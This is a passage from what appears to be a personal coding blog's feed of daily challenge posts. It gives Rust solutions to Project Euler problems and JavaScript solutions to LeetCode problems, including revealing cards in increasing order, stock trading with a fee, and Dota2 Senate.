class="number">74</span>, <span class="number">31</span>, <span class="number">49</span>, <span class="number">71</span>, <span class="number">48</span>, <span class="number">86</span>, <span class="number">81</span>, <span class="number">16</span>, <span class="number">23</span>, <span class="number">57</span>, <span class="number">05</span>, <span class="number">54</span>],</span><br><span class="line">[<span class="number">01</span>, <span class="number">70</span>, <span class="number">54</span>, <span class="number">71</span>, <span class="number">83</span>, <span class="number">51</span>, <span class="number">54</span>, <span class="number">69</span>, <span class="number">16</span>, <span class="number">92</span>, <span class="number">33</span>, <span class="number">48</span>, <span class="number">61</span>, <span class="number">43</span>, <span class="number">52</span>, <span class="number">01</span>, <span class="number">89</span>, <span class="number">19</span>, <span class="number">67</span>, <span class="number">48</span>]];</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..<span class="number">19</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">0</span>..<span class="number">20</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">16</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> arr[i][j]*arr[i+<span class="number">1</span>][j]*arr[i+<span class="number">2</span>][j]*arr[i+<span class="number">3</span>][j]&gt;ans &#123;</span><br><span class="line">                    ans = arr[i][j]*arr[i+<span class="number">1</span>][j]*arr[i+<span class="number">2</span>][j]*arr[i+<span class="number">3</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> j &lt; <span class="number">17</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> arr[i][j]*arr[i][j+<span class="number">1</span>]*arr[i][j+<span class="number">2</span>]*arr[i][j+<span class="number">3</span>]&gt;ans &#123;</span><br><span class="line">                    ans = arr[i][j]*arr[i][j+<span class="number">1</span>]*arr[i][j+<span class="number">2</span>]*arr[i][j+<span class="number">3</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">16</span> &amp;&amp; j &lt; <span class="number">17</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> arr[i][j]*arr[i+<span class="number">1</span>][j+<span class="number">1</span>]*arr[i+<span class="number">2</span>][j+<span class="number">2</span>]*arr[i+<span class="number">3</span>][j+<span class="number">3</span>]&gt;ans &#123;</span><br><span class="line">                    ans = arr[i][j]*arr[i+<span class="number">1</span>][j+<span class="number">1</span>]*arr[i+<span class="number">2</span>][j+<span class="number">2</span>]*arr[i+<span class="number">3</span>][j+<span class="number">3</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> i &lt; <span class="number">16</span> &amp;&amp; j &gt; <span class="number">2</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> arr[i][j]*arr[i+<span class="number">1</span>][j-<span class="number">1</span>]*arr[i+<span class="number">2</span>][j-<span class="number">2</span>]*arr[i+<span class="number">3</span>][j-<span class="number">3</span>]&gt;ans &#123;</span><br><span class="line">                    ans = arr[i][j]*arr[i+<span class="number">1</span>][j-<span class="number">1</span>]*arr[i+<span class="number">2</span>][j-<span class="number">2</span>]*arr[i+<span class="number">3</span>][j-<span class="number">3</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">950. Reveal Cards In Increasing Order</span><br><span class="line"></span><br><span class="line">In a deck of cards, every card has a unique integer.  You can order the deck in any order you want.</span><br><span class="line"></span><br><span class="line">Initially, all the cards start face down (unrevealed) in one deck.</span><br><span class="line"></span><br><span class="line">Now, you do the following steps repeatedly, until all cards are revealed:</span><br><span class="line"></span><br><span class="line">Take the top card of the deck, reveal it, and take it out of the deck.</span><br><span class="line">If there are still cards in the deck, put the next top card of the deck at the bottom of the deck.</span><br><span class="line">If there are still unrevealed cards, go back to step 1.  Otherwise, stop.</span><br><span class="line">Return an ordering of the deck that would reveal the cards in increasing order.</span><br><span class="line"></span><br><span class="line">The first entry in the answer is considered to be the top of the deck.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line"></span><br><span class="line">Input: [17,13,11,2,3,5,7]</span><br><span class="line">Output: [2,13,3,11,5,17,7]</span><br><span class="line">Explanation: </span><br><span class="line">We get the deck in the order [17,13,11,2,3,5,7] (this order doesn&apos;t matter), and reorder it.</span><br><span class="line">After reordering, the deck starts as [2,13,3,11,5,17,7], where 2 is the top of the deck.</span><br><span class="line">We reveal 2, and move 13 to the bottom.  The deck is now [3,11,5,17,7,13].</span><br><span class="line">We reveal 3, and move 11 to the bottom.  The deck is now [5,17,7,13,11].</span><br><span class="line">We reveal 5, and move 17 to the bottom.  The deck is now [7,13,11,17].</span><br><span class="line">We reveal 7, and move 13 to the bottom.  The deck is now [11,17,13].</span><br><span class="line">We reveal 11, and move 17 to the bottom.  The deck is now [13,17].</span><br><span class="line">We reveal 13, and move 17 to the bottom.  The deck is now [17].</span><br><span class="line">We reveal 17.</span><br><span class="line">Since all the cards revealed are in increasing order, the answer is correct.</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">1 &lt;= A.length &lt;= 1000</span><br><span class="line">1 &lt;= A[i] &lt;= 10^6</span><br><span class="line">A[i] != A[j] for all i != j</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>One way is to simulate the reversing process, another way is find where every location of cards in original deck.</p><p>But sort need $O(n\log n)$, I guess that&#39;s the upper bound of this problem.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; deck</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> deckRevealedIncreasing = <span class="function">(<span class="params">deck</span>) =&gt;</span> &#123;</span><br><span class="line">  deck.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> &#123;<span class="keyword">return</span> a-b;&#125;);</span><br><span class="line">  <span class="keyword">const</span> ans = <span class="keyword">new</span> <span class="built_in">Array</span>(deck.length);</span><br><span class="line">  <span class="keyword">let</span> index = [];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; deck.length; ++i) &#123;</span><br><span class="line">    index.push(i);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">let</span> hold = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">let</span> cnt = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>(index.length) &#123;</span><br><span class="line">    <span class="keyword">if</span>(hold) &#123;</span><br><span class="line">      <span class="keyword">let</span> i = index.shift();</span><br><span class="line">      ans[i] = deck[cnt];</span><br><span class="line">      ++cnt;</span><br><span class="line">      hold = <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      hold = <span class="literal">true</span>;</span><br><span class="line">      index.push(index.shift())</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; deck</span></span><br><span class="line"><span class="comment"> * @return &#123;number[]&#125; </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> deckRevealedIncreasing_simu = <span class="function">(<span class="params">deck</span>) =&gt;</span> &#123;</span><br><span class="line">  deck.sort(<span class="function">(<span class="params">a,b</span>) =&gt;</span> &#123;<span class="keyword">return</span> a-b;&#125;);</span><br><span class="line">  <span class="keyword">const</span> ans = [deck[deck.length - <span class="number">1</span>]];</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">let</span> i = deck.length - <span class="number">2</span>; i &gt;= <span class="number">0</span> ; --i) &#123;</span><br><span class="line">    ans.unshift(ans.pop());</span><br><span class="line">    ans.unshift(deck[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// console.log(deckRevealedIncreasing([17,13,11,2,3,5,7]));</span></span><br><span class="line"><span class="comment">// console.log(deckRevealedIncreasing_simu([17,13,11,2,3,5,7]));</span></span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-30 Daily Challenge</title>
      <link href="/2018-12-30-Daily-Challenge/"/>
      <url>/2018-12-30-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Summation of primes</em> in <em>Rust</em> and <em>Best Time to Buy and Sell Stock with Transaction Fee</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Summation of primes</span><br><span class="line"></span><br><span class="line">Problem 10 </span><br><span class="line"></span><br><span class="line">The sum of the primes below 10 is 2 + 3 + 5 + 7 = 17.</span><br><span class="line"></span><br><span class="line">Find the sum of all the primes below two million.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Sieve for prime!!!!</p><p>Extern crate again ;D</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">crate</span> primal;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> sieve = primal::Sieve::new(<span class="number">2_000_000</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> ans64: <span class="built_in">i64</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> sieve.primes_from(<span class="number">2</span>) &#123;</span><br><span class="line">        ans64 += p <span class="keyword">as</span> <span class="built_in">i64</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Answer is &#123;&#125;"</span>, ans64);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">714. Best Time to Buy and Sell Stock with Transaction Fee</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Your are given an array of integers prices, for which the i-th element is the price of a given stock on day i; and a non-negative integer fee representing a transaction fee.</span><br><span class="line"></span><br><span class="line">You may complete as many transactions as you like, but you need to pay the transaction fee for each transaction. You may not buy more than 1 share of a stock at a time (ie. you must sell the stock share before you buy again.)</span><br><span class="line"></span><br><span class="line">Return the maximum profit you can make.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line">Input: prices = [1, 3, 2, 8, 4, 9], fee = 2</span><br><span class="line">Output: 8</span><br><span class="line">Explanation: The maximum profit can be achieved by:</span><br><span class="line">Buying at prices[0] = 1</span><br><span class="line">Selling at prices[3] = 8</span><br><span class="line">Buying at prices[4] = 4</span><br><span class="line">Selling at prices[5] = 9</span><br><span class="line">The total profit is ((8 - 1) - 2) + ((9 - 4) - 2) = 8.</span><br><span class="line">Note:</span><br><span class="line"></span><br><span class="line">0 &lt; prices.length &lt;= 50000.</span><br><span class="line">0 &lt; prices[i] &lt; 50000.</span><br><span class="line">0 &lt;= fee &lt; 50000.</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I remembered that similar question is example problem of <em>Divide and Conquer</em> algorithm in <em>Introduction to Algorithm</em>. But this question can not be done with this method.</p><p>We should maintain the max profit of holding stock and not holding stock, and recursively conquer it.</p><h2 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @param &#123;number[]&#125; prices</span></span><br><span class="line"><span class="comment"> * @param &#123;number&#125; fee</span></span><br><span class="line"><span class="comment"> * @return &#123;number&#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">var</span> maxProfit = <span class="function">(<span class="params">prices, fee</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">let</span> nothold = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> hold = -prices[<span class="number">0</span>] - fee;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">const</span> p <span class="keyword">of</span> prices)&#123;</span><br><span class="line">    nothold = (nothold&gt;hold+p)?nothold:hold+p;</span><br><span class="line">    hold = (hold&gt;nothold-p-fee)?hold:nothold-p-fee;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nothold;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> DailyChallenge </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Math </tag>
            
            <tag> Algorithm </tag>
            
            <tag> LeetCode </tag>
            
            <tag> ProjectEuler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>2018-12-29 Daily Challenge</title>
      <link href="/2018-12-29-Daily-Challenge/"/>
      <url>/2018-12-29-Daily-Challenge/</url>
      <content type="html"><![CDATA[<p>What I&#39;ve done today is <em>Special Pythagorean triplet</em> in <em>Rust</em> and <em>Dota2 Senate</em> in <em>JavaScript</em>.</p><a id="more"></a><h1 id="Math"><a href="#Math" class="headerlink" title="Math"></a>Math</h1><h2 id="Problem"><a href="#Problem" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Special Pythagorean triplet</span><br><span class="line"></span><br><span class="line">Problem 9 </span><br><span class="line"></span><br><span class="line">A Pythagorean triplet is a set of three natural numbers, a &lt; b &lt; c, for which,</span><br><span class="line"></span><br><span class="line">a^2 + b^2 = c^2</span><br><span class="line">For example, 3^2 + 4^2 = 9 + 16 = 25 = 5^2.</span><br><span class="line"></span><br><span class="line">There exists exactly one Pythagorean triplet for which a + b + c = 1000.</span><br><span class="line">Find the product abc.</span><br></pre></td></tr></table></figure><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Brute force is still enough.</p><p>And I implicated the solution in the overview, but I need some time to digest it.</p><h2 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h2><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> a: (<span class="built_in">i32</span>, <span class="built_in">i32</span>, <span class="built_in">i32</span>);</span><br><span class="line">    a = pythagorean_triplet_brute(<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"a = &#123;&#125;\nb = &#123;&#125;\nc = &#123;&#125;\nAnswer is &#123;&#125;"</span>,a.<span class="number">0</span>,a.<span class="number">1</span>,a.<span class="number">2</span>,a.<span class="number">0</span>*a.<span class="number">1</span>*a.<span class="number">2</span>);</span><br><span class="line">    a = pythagorean_triplet(<span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"a = &#123;&#125;\nb = &#123;&#125;\nc = &#123;&#125;\nAnswer is &#123;&#125;"</span>,a.<span class="number">0</span>,a.<span class="number">1</span>,a.<span class="number">2</span>,a.<span class="number">0</span>*a.<span class="number">1</span>*a.<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">pythagorean_triplet_brute</span></span>(n: <span class="built_in">i32</span>) -&gt; (<span class="built_in">i32</span>, <span class="built_in">i32</span>, <span class="built_in">i32</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> b = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..(n/<span class="number">3</span>)+<span class="number">1</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="number">1</span>..(n-i)/<span class="number">2</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> k = n - i - j;</span><br><span class="line">            <span class="keyword">if</span> !(i&lt;j&amp;&amp;j&lt;k) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> i*i + j*j == k*k &#123;</span><br><span class="line">                c = k;</span><br><span class="line">                b = j;</span><br><span class="line">                a = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    (a, b, c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only return first Pythagorean triplet</span></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">pythagorean_triplet</span></span>(s: <span class="built_in">i32</span>) -&gt; (<span class="built_in">i32</span>, <span class="built_in">i32</span>, <span class="built_in">i32</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> s2: <span class="built_in">i32</span> = s /<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> sm: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> k: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp: <span class="built_in">f64</span> = (s2 <span class="keyword">as</span> <span class="built_in">f64</span>) / <span class="number">2f64</span>;</span><br><span class="line">    <span class="keyword">let</span> d: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">let</span> n: <span class="built_in">i32</span>;</span><br><span class="line">    tmp = tmp.sqrt().ceil();</span><br><span class="line">    <span class="keyword">let</span> mlimit: <span class="built_in">i32</span> = tmp <span class="keyword">as</span> <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">for</span> m <span class="keyword">in</span> <span class="number">2</span>..mlimit &#123;</span><br><span class="line">        <span class="keyword">if</span> s2 % m == <span class="number">0</span> &#123;</span><br><span class="line">            sm = s2 / m;</span><br><span class="line">            <span class="keyword">while</span> sm % <span class="number">2</span> == <span class="number">0</span> &#123;</span><br><span class="line">                sm /= <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> m % <span class="number">2</span> == <span class="number">1</span> &#123;</span><br><span class="line">                k = m + <span class="number">2</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                k = m + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> k &lt; <span class="number">2</span>*m &amp;&amp; k &lt;= sm &#123;</span><br><span class="line">                <span class="keyword">if</span> sm % k == <span class="number">0</span> &amp;&amp; gcd(k, m) == <span class="number">1</span> &#123;</span><br><span class="line">                    d = s2 / (k*m);</span><br><span class="line">                    n = k-m;</span><br><span class="line">                    <span class="keyword">return</span> (d*(m*m-n*n),<span class="number">2</span>*d*m*n,d*(m*m+n*n));</span><br><span class="line">                &#125;</span><br><span class="line">                k += <span class="number">2</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">gcd</span></span>(<span class="keyword">mut</span> a: <span class="built_in">i32</span>, <span class="keyword">mut</span> b: <span class="built_in">i32</span>) -&gt; <span class="built_in">i32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> tmp: <span class="built_in">i32</span>;</span><br><span class="line">    <span class="keyword">while</span> b!= <span class="number">0</span> &#123;</span><br><span class="line">        tmp = a;</span><br><span class="line">        a = b;</span><br><span class="line">        b = tmp % b;</span><br><span class="line">    &#125;</span><br><span class="line">    a</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Algorithm"><a href="#Algorithm" class="headerlink" title="Algorithm"></a>Algorithm</h1><h2 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem"></a>Problem</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">649. Dota2 Senate</span><br><span class="line"></span><br><span class="line">In the world of Dota2, there are two parties: the Radiant and the Dire.</span><br><span class="line"></span><br><span class="line">The Dota2 senate consists of senators coming from two parties. Now the senate wants to make a decision about a change in the Dota2 game. The voting for this change is a round-based procedure. In each round, each senator can exercise one of the two rights:</span><br><span class="line"></span><br><span class="line">Ban one senator&apos;s right: </span><br><span class="line">A senator can make another senator lose all his rights in this and all the following rounds.</span><br><span class="line">Announce the victory: </span><br><span class="line">If this senator found the senators who still have rights to vote are all from the same party, he can announce the victory and make the decision about the change in the game.</span><br><span class="line">Given a string representing each senator&apos;s party belonging. The character &apos;R&apos; and &apos;D&apos; represent the Radiant party and the Dire party respectively. Then if there are n senators, the size of the given string will be n.</span><br><span class="line"></span><br><span class="line">The round-based procedure starts from the first senator to the last senator in the given order. This procedure will last until the end of voting. All the senators who have lost their rights will be skipped during the procedure.</span><br><span class="line"></span><br><span class="line">Suppose every senator is smart enough and will play the best strategy for his own party, you need to predict which party will finally announce the victory and make the change in the Dota2 game. The output should be Radiant or Dire.</span><br><span class="line"></span><br><span class="line">Example 1:</span><br><span class="line">Input: &quot;RD&quot;</span><br><span class="line">Output: &quot;Radiant&quot;</span><br><span class="line">Explanation: The first senator comes from Radiant and he can just ban the next senator&apos;s right in the round 1. </span><br><span class="line">And the second senator can&apos;t exercise any rights any more since his right has been banned. </span><br><span class="line">And in the round 2, the first senator can just announce the victory since he is the only guy in the senate who can vote.</span><br><span class="line">Example 2:</span><br><span class="line">Input: &quot;RDD&quot;</span><br><span class="line">Output: &quot;Dire&quot;</span><br><span class="line">Explanation: </span><br><span class="line">The first senator comes from Radiant and he can just ban the next senator&apos;s right in the round 1. </span><br><span class="line">And the second senator can&apos;t exercise any rights anymore since his right has been banned. </span><br><span class="line">And the third senator comes from Dire and he can ban the first senator&apos;s right in the round 1. </span><br><span class="line">And in the round 2, the third senator can just announce the victory since he is the only guy in the senate who can vote.</span><br><span class="line">Note:</span><br><span class="line">The length of the given string will in the range [1, 10,000].</span><br></pre></td></tr></table></figure><h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>I came up a Greedy method which said that when it comes to an unbanned senator, its best choice is ban the opponent 